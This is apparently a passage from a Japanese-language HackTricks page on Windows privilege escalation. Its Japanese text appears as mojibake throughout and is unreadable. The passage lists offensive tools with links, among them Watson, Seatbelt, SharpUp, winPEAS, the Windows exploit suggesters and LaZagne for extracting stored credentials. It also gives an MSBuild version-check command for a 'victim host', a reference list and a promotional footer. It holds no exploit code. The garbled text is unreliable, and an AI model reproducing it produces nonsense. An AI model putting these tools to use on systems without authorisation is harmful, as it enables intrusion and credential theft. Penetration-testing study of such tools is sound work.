[**Watson**](https://github.com/rasta-mouse/Watson) -- æ—¢çŸ¥ã®ç‰¹æ¨©æ˜‡æ ¼è„†å¼±æ€§ã‚’æ¤œç´¢ï¼ˆVisualStudioã‚’ä½¿ç”¨ã—ã¦ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼‰ï¼ˆ[**äº‹å‰ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«æ¸ˆã¿**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- ãƒ›ã‚¹ãƒˆã‚’åˆ—æŒ™ã—ã€è¨­å®šãƒŸã‚¹ã‚’æ¤œç´¢ã—ã¾ã™ï¼ˆç‰¹æ¨©æ˜‡æ ¼ã‚ˆã‚Šã‚‚æƒ…å ±åé›†ãƒ„ãƒ¼ãƒ«ï¼‰ï¼ˆã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ãŒå¿…è¦ï¼‰ **ï¼ˆ**[**äº‹å‰ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«æ¸ˆã¿**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- å¤šãã®ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã‹ã‚‰è³‡æ ¼æƒ…å ±ã‚’æŠ½å‡ºã—ã¾ã™ï¼ˆgithubã«äº‹å‰ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã•ã‚ŒãŸexeãŒã‚ã‚Šã¾ã™ï¼‰**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUpã®C#ãƒãƒ¼ãƒˆ**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- è¨­å®šãƒŸã‚¹ã‚’ãƒã‚§ãƒƒã‚¯ï¼ˆgithubã«äº‹å‰ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã•ã‚ŒãŸå®Ÿè¡Œå¯èƒ½ãƒ•ã‚¡ã‚¤ãƒ«ãŒã‚ã‚Šã¾ã™ï¼‰ã€‚ãŠå‹§ã‚ã—ã¾ã›ã‚“ã€‚Win10ã§ã¯ã†ã¾ãå‹•ä½œã—ã¾ã›ã‚“ã€‚\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- å¯èƒ½ãªè¨­å®šãƒŸã‚¹ã‚’ãƒã‚§ãƒƒã‚¯ï¼ˆpythonã‹ã‚‰ã®exeï¼‰ã€‚ãŠå‹§ã‚ã—ã¾ã›ã‚“ã€‚Win10ã§ã¯ã†ã¾ãå‹•ä½œã—ã¾ã›ã‚“ã€‚

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- ã“ã®æŠ•ç¨¿ã‚’åŸºã«ä½œæˆã•ã‚ŒãŸãƒ„ãƒ¼ãƒ«ï¼ˆé©åˆ‡ã«æ©Ÿèƒ½ã•ã›ã‚‹ãŸã‚ã«accesschkã¯å¿…è¦ã‚ã‚Šã¾ã›ã‚“ãŒã€ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼‰ã€‚

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo**ã®å‡ºåŠ›ã‚’èª­ã¿å–ã‚Šã€å‹•ä½œã™ã‚‹ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’æ¨å¥¨ã—ã¾ã™ï¼ˆãƒ­ãƒ¼ã‚«ãƒ«pythonï¼‰\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo**ã®å‡ºåŠ›ã‚’èª­ã¿å–ã‚Šã€å‹•ä½œã™ã‚‹ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’æ¨å¥¨ã—ã¾ã™ï¼ˆãƒ­ãƒ¼ã‚«ãƒ«pythonï¼‰

**Meterpreter**

_multi/recon/local\_exploit\_suggestor_

ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã‚’æ­£ã—ã„.NETã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¦ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼ˆ[ã“ã¡ã‚‰ã‚’å‚ç…§](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)ï¼‰ã€‚è¢«å®³è€…ãƒ›ã‚¹ãƒˆã§ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã¦ã„ã‚‹.NETã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’ç¢ºèªã™ã‚‹ã«ã¯ã€æ¬¡ã®æ“ä½œã‚’è¡Œã„ã¾ã™ï¼š
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## å‚è€ƒæ–‡çŒ®

* [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\\
* [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
* [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\\
* [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=\_8xJaaQlpBo)\\
* [https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\\
* [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\\
* [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
* [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

<details>

<summary><strong>ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§ã®AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ã¦ã¿ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã«ã‚¢ã‚¯ã‚»ã‚¹**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€HackTricksã‚’**PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[NFTs](https://opensea.io/collection/the-peass-family)ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„
* [**å…¬å¼PEASSï¼†HackTricks swag**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†
* **[ğŸ’¬](https://emojipedia.org/speech-balloon/) Discordã‚°ãƒ«ãƒ¼ãƒ—**ã«å‚åŠ ã™ã‚‹ã‹ã€[Telegramã‚°ãƒ«ãƒ¼ãƒ—](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter**ã§ç§ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
